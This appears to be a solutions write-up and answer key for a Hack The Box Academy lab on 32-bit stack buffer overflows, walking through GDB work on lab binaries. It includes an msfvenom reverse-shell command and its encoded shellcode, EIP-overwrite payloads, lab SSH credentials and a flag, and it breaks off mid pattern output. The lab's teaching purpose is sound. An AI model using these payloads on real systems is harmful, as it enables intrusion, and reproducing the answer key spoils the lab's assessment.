
| Section                             | Question Number | Answer                              |
| ----------------------------------- | --------------- | ----------------------------------- |
| Stack-Based Buffer Overflow         | Question 1      | 0x000005aa                          |
| Take Control of EIP                 | Question 1      | 0x55555555                          |
| Determine the Length for Shellcode  | Question 1      | 250 Bytes                           |
| Identification of Bad Characters    | Question 1      | \\x00\\x09\\x0a\\x20                |
| Generating Shellcode                | Question 1      | 0x21000                             |
| Skills Assessment - Buffer Overflow | Question 1      | ELF 32-bit                          |
| Skills Assessment - Buffer Overflow | Question 2      | 2060                                |
| Skills Assessment - Buffer Overflow | Question 3      | 0x22000                             |
| Skills Assessment - Buffer Overflow | Question 4      | HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Stack-Based Buffer Overflow

## Question 1

### "At which address in the "main" function is the "bowfunc" function gets called?"

Students first need to SSH into the spawned target using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.42.190

The authenticity of host '10.129.42.190 (10.129.42.190)' can't be established.
ECDSA key fingerprint is SHA256:dU6PhCzXRsjDJRo3p0vZiuAGRBsQoKYcJ8/LNu3e7zc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.42.190' (ECDSA) to the list of known hosts.
htb-student@10.129.42.190's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-124-generic x86_64)

<SNIP>

Last login: Fri Nov 20 11:43:13 2020
htb-student@nixbof32:~$
```

Then, students will find an ELF file named "bow" on which they need to run `GDB` on with the `-q` (short version of `-quiet`) option:

Code: shell

```shell
gdb bow -q
```

```
htb-student@nixbof32:~$ gdb bow -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb)
```

Students can set `GDB` to use the Intel syntax instead of the `AT&T` syntax:

Code: shell

```shell
set disassembly-flavor intel
```

```
(gdb) set disassembly-flavor intel
```

At last, students need to disassemble the main function and will notice that "bowfunc" is called at the address `0x000005aa` (it is boxed down in the output for emphasis):

Code: shell

```shell
disassemble main
```

```
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:		lea    ecx,[esp+0x4]
   0x00000586 <+4>:		and    esp,0xfffffff0
   0x00000589 <+7>:		push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax        
   ______________________________________________________________________
   
   0x000005aa <+40>:	call   0x54d <bowfunc>
   ______________________________________________________________________
   0x000005af <+45>:	add    esp,0x10
   0x000005b2 <+48>:	sub    esp,0xc
   0x000005b5 <+51>:	lea    eax,[ebx-0x1974]
   0x000005bb <+57>:	push   eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    esp,0x10
   0x000005c4 <+66>:	mov    eax,0x1
   0x000005c9 <+71>:	lea    esp,[ebp-0x8]
   0x000005cc <+74>:	pop    ecx
   0x000005cd <+75>:	pop    ebx
   0x000005ce <+76>:	pop    ebp
   0x000005cf <+77>:	lea    esp,[ecx-0x4]
   0x000005d2 <+80>:	ret    
End of assembler dump.
```

Answer: `0x000005aa`

# Take Control of EIP

## Question 1

### "Examine the registers and submit the address of EBP as the answer."

Students first need to SSH into the spawned target using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.42.190

htb-student@10.129.42.190's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-124-generic x86_64)

<SNIP>

Last login: Fri Nov 20 11:43:13 2020
htb-student@nixbof32:~$
```

Then, after running `GDB` on the "bow" ELF, students need to overwrite the `EIP` register similar to how the module section's reading has overwritten it, and then examine the registers:

Code: shell

```shell
gdb bow -q
run $(python -c "print '\x55' * 1036 + '\x66' * 4")
info registers
```

```
htb-student@nixbof32:~$ gdb bow -q

Reading symbols from bow...(no debugging symbols found)...done.

(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

Starting program: /home/htb-student/bow $(python -c "print '\x55' * 1036 + '\x66' * 4")

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()

(gdb) info registers

eax            0x1	1
ecx            0xffffd6f0	-10512
edx            0xffffd0b8	-12104
ebx            0x55555555	1431655765
esp            0xffffd0c0	0xffffd0c0
______________________________________________________________________

ebp            0x55555555	0x55555555
______________________________________________________________________
esi            0xf7fc2000	-134471680
edi            0x0	0
eip            0x66666666	0x66666666
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

The `EBP` register's address (boxed for emphasis) has been overwritten with the letter `U` (i.e., `\x55`).

Alternatively, instead of printing the addresses of all registers, students can specify `ebp` alone:

Code: shell

```shell
info registers $ebp
```

```
(gdb) info registers $ebp

ebp    0x55555555	0x55555555
```

Answer: `0x55555555`

# Determine the Length for Shellcode

## Question 1

### "How large can our shellcode theoretically become if we count NOPS and the shellcode size together? (Format: 00 Bytes)"

Students need to add together the number of bytes of the `NOP` instructions with the number of bytes for the shellcode as given in the section's reading:

`100 bytes` (NOPs) + `150 bytes` (Shellcode) = `250 bytes`

Answer: `250 Bytes`

# Identification of Bad Characters

## Question 1

### "Find all bad characters that change or interrupt our sent bytes' order and submit them as the answer (e.g., format: \\x00\\x11)."

Students first need to SSH into the spawned target using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.42.190

htb-student@10.129.42.190's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-124-generic x86_64)

<SNIP>

Last login: Fri Nov 20 11:43:13 2020
htb-student@nixbof32:~$
```

Then, after running `GDB` on the "bow" ELF, students need to set a breakpoint on "bowfunc":

Code: shell

```shell
break "bowfunc"
```

The hint specifies that there are 4 bad characters in total, and since students know from the section's reading three bad characters already (i.e., `\x00`, `\x09`, `\x0a`), only one is left to be identified.

The first bad character is `\x00`:

![[HTB Solutions/Others/z. images/1210fbc7d0092de201435ac255a34ba4_MD5.jpg]]

The second bad character is `\x09`:

![[HTB Solutions/Others/z. images/f12986dcadba333406a1388c425320c3_MD5.jpg]]

The third bad character is `\x0a`:

![[HTB Solutions/Others/z. images/45d5b33e8f5792bad86ccb898b87ba92_MD5.jpg]]

Thus, students need to remove the three characters `\x00`, `\x09`, and `\x0a` from the list of characters and subtract 3 from 256 (the total number of characters) to make it 253:

```
(gdb) run $(python -c 'print "\x55" * (1040 - 253 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
```

Then, students need to examine the stack using the following `GDB` command:

Code: shell

```shell
x/2000xb $esp+500
```

Where `x` is for `examine`, `2000` is the number of bytes requested to be examined, the second `x` displays the bytes formatted in hex, `b` specifies the unit in which the output is displayed (which in this case is `bytes`), and at last, `$esp+500` specifies the starting display address:

```
(gdb) x/2000xb $esp+500

0xffffd298:	0xe2	0xdf	0xff	0xff	0x0f	0x00	0x00	0x00
0xffffd2a0:	0xcb	0xd2	0xff	0xff	0x00	0x00	0x00	0x00
0xffffd2a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd2b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd2b8:	0x00	0x00	0x00	0x28	0x80	0xa1	0xe3	0x00
0xffffd2c0:	0xa2	0x17	0x10	0x80	0x04	0xf2	0xde	0x43
0xffffd2c8:	0xc2	0x1b	0x7b	0x69	0x36	0x38	0x36	0x00
0xffffd2d0:	0x00	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f
0xffffd2d8:	0x68	0x74	0x62	0x2d	0x73	0x74	0x75	0x64
0xffffd2e0:	0x65	0x6e	0x74	0x2f	0x62	0x6f	0x77	0x00
0xffffd2e8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2f0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2f8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd300:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd308:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd310:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd318:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd320:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd328:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd330:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd338:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd340:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd348:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd350:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd358:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd360:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd368:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd370:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd378:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd380:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd388:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd390:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd398:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd3a0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd3a8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd3b0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd3b8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
---Type <return> to continue, or q <return> to quit---
```

Once students see the byte `0x55` repeating, they need to continue to press `r` then press `Enter` until it stops repeating and `0x01` appears (not `0x00`, since it is a bad character and has been excluded already):

```
0xffffd4e8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd4f0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd4f8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd500:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd508:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd510:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd518:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd520:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd528:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd530:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd538:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd540:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd548:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd550:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd558:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd560:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd568:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd570:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd578:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd580:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd588:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd590:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd598:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5a0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5a8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5c0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5c8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5d0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5d8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5e0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5e8:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5f0:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x01
0xffffd5f8:	0x02	0x03	0x04	0x05	0x06	0x07	0x08	0x0b
0xffffd600:	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13
__________________________________________________________________________________

0xffffd608:	0x14	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b
__________________________________________________________________________________

---Type <return> to continue, or q <return> to quit---
```

Students will notice from the boxed address (added for emphasis) that it does not contain the byte `\x20` (i.e., `DC4`), thus it must be the fourth and final bad character. Combined all together, the list of bad characters becomes `\x00\x09\x0a\x20`.

Answer: `\x00\x09\x0a\x20`

# Generating Shellcode

## Question 1

### "Submit the size of the stack space after overwriting the EIP as the answer. (Format: 0x00000)"

On Pwnbox/`PMVPN`, students first need to generate the shellcode using `msfvenom`:

Code: shell

```shell
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=9001 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"
```

```
┌─[us-academy-1]─[10.10.14.24]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xcd\xd9\x74\x24\xf4\x5a\xbd\xe5\x8c\x81\x3c\x33\xc9\xb1"
"\x12\x83\xea\xfc\x31\x6a\x13\x03\x8f\x9f\x63\xc9\x7e\x7b\x94"
"\xd1\xd3\x38\x08\x7c\xd1\x37\x4f\x30\xb3\x8a\x10\xa2\x62\xa5"
"\x2e\x08\x14\x8c\x29\x6b\x7c\x70\xca\x8b\x7d\xe6\xc8\x8b\x07"
"\x9f\x45\x6a\x47\x39\x06\x3c\xf4\x75\xa5\x37\x1b\xb4\x2a\x15"
"\xb3\x29\x04\xe9\x2b\xde\x75\x22\xc9\x77\x03\xdf\x5f\xdb\x9a"
"\xc1\xef\xd0\x51\x81";
```

Afterward, students need to set a breakpoint on "bowfunc" after they run `GDB` on the "bow" ELF:

Code: shell

```shell
break "bowfunc"
```

Then, students need to send the exploit which includes the generated shellcode as input to the program:

Code: shell

```shell
run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xcd\xd9\x74\x24\xf4\x5a\xbd\xe5\x8c\x81\x3c\x33\xc9\xb1\x12\x83\xea\xfc\x31\x6a\x13\x03\x8f\x9f\x63\xc9\x7e\x7b\x94\xd1\xd3\x38\x08\x7c\xd1\x37\x4f\x30\xb3\x8a\x10\xa2\x62\xa5\x2e\x08\x14\x8c\x29\x6b\x7c\x70\xca\x8b\x7d\xe6\xc8\x8b\x07\x9f\x45\x6a\x47\x39\x06\x3c\xf4\x75\xa5\x37\x1b\xb4\x2a\x15\xb3\x29\x04\xe9\x2b\xde\x75\x22\xc9\x77\x03\xdf\x5f\xdb\x9a\xc1\xef\xd0\x51\x81" + "\x66" * 4')
```

```
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xcd\xd9\x74\x24\xf4\x5a\xbd\xe5\x8c\x81\x3c\x33\xc9\xb1\x12\x83\xea\xfc\x31\x6a\x13\x03\x8f\x9f\x63\xc9\x7e\x7b\x94\xd1\xd3\x38\x08\x7c\xd1\x37\x4f\x30\xb3\x8a\x10\xa2\x62\xa5\x2e\x08\x14\x8c\x29\x6b\x7c\x70\xca\x8b\x7d\xe6\xc8\x8b\x07\x9f\x45\x6a\x47\x39\x06\x3c\xf4\x75\xa5\x37\x1b\xb4\x2a\x15\xb3\x29\x04\xe9\x2b\xde\x75\x22\xc9\x77\x03\xdf\x5f\xdb\x9a\xc1\xef\xd0\x51\x81" + "\x66" * 4')

Starting program: /home/htb-student/bow $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xcd\xd9\x74\x24\xf4\x5a\xbd\xe5\x8c\x81\x3c\x33\xc9\xb1\x12\x83\xea\xfc\x31\x6a\x13\x03\x8f\x9f\x63\xc9\x7e\x7b\x94\xd1\xd3\x38\x08\x7c\xd1\x37\x4f\x30\xb3\x8a\x10\xa2\x62\xa5\x2e\x08\x14\x8c\x29\x6b\x7c\x70\xca\x8b\x7d\xe6\xc8\x8b\x07\x9f\x45\x6a\x47\x39\x06\x3c\xf4\x75\xa5\x37\x1b\xb4\x2a\x15\xb3\x29\x04\xe9\x2b\xde\x75\x22\xc9\x77\x03\xdf\x5f\xdb\x9a\xc1\xef\xd0\x51\x81" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

Once the breakpoint is hit, students then need to use the command `info proc mappings` to view the [memory address space ranges accessible in this process](https://sourceware.org/gdb/onlinedocs/gdb/Process-Information.html) to find out that the size of the stack is `0x21000`:

```
(gdb) info proc mappings

process 2097
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/htb-student/bow
	0x56556000 0x56557000     0x1000        0x0 /home/htb-student/bow
	0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/bow
	0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fc3000 0xf7fc6000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	__________________________________________________________________________________
	
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
	__________________________________________________________________________________
```

Answer: `0x21000`

# Skills Assessment - Buffer Overflow

## Question 1

### "Determine the file type of "leave\_msg" binary and submit it as the answer."

After spawning the target machine, students first need to connect to it with SSH using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-2]─[10.10.14.114]─[htb-ac413848@htb-ntyskvpmbs]─[~]
└──╼ [★]$ ssh htb-student@10.129.42.191
The authenticity of host '10.129.42.191 (10.129.42.191)' can't be established.
ECDSA key fingerprint is SHA256:dU6PhCzXRsjDJRo3p0vZiuAGRBsQoKYcJ8/LNu3e7zc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.42.191' (ECDSA) to the list of known hosts.
htb-student@10.129.42.191's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-124-generic x86_64)

<SNIP>

Last login: Fri Nov 20 12:46:31 2020
htb-student@nixbof32skills:~$
```

Subsequently, students need to use the `file` command on the file `leave_msg`, to find that it is a `ELF 32-bit` binary:

Code: shell

```shell
file leave_msg 
```

```
htb-student@nixbof32skills:~$ file leave_msg

leave_msg: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8694607c1cba3fb3814a144fb014da53d3f3e49e, not stripped
```

Alternatively, students can use `objdump` to determine the file type:

Code: shell

```shell
objdump -f leave_msg
```

```
htb-student@nixbof32skills:~$ objdump -f leave_msg 

leave_msg:     file format elf32-i386
architecture: i386, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x00000550
```

Answer: `ELF 32-bit`

# Skills Assessment - Buffer Overflow

## Question 2

### "How many bytes in total must be sent before reaching EIP?"

Using the same SSH connection established in the previous question, students need to run `GDB` on `leave_msg` with the `-q` (short version of `--quiet`):

Code: shell

```shell
gdb leave_msg -q
```

```
htb-student@nixbof32skills:~$ gdb leave_msg -q

Reading symbols from leave_msg...(no debugging symbols found)...done.
(gdb)
```

Thereafter, students need to attain `Core Dump`/`Segmentation fault` by sending large number of input, `\x55` (i.e., the letter `U`) will be used in here. After trail-and-error, students will find that sending a payload that is between 2000 and 2100 bytes will cause a `segmentation fault`:

Code: shell

```shell
run $(python -c 'print "\x55" * 2100')
```

```
(gdb) run $(python -c 'print "\x55" * 2100')
Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * 2100')

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Therefore, students need to utilize `pattern_create.rb` to create a 2100-bytes payload:

Code: shell

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```

```
┌─[eu-academy-2]─[10.10.14.114]─[htb-ac413848@htb-ntyskvpmbs]─[~]
└──╼ [★]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8C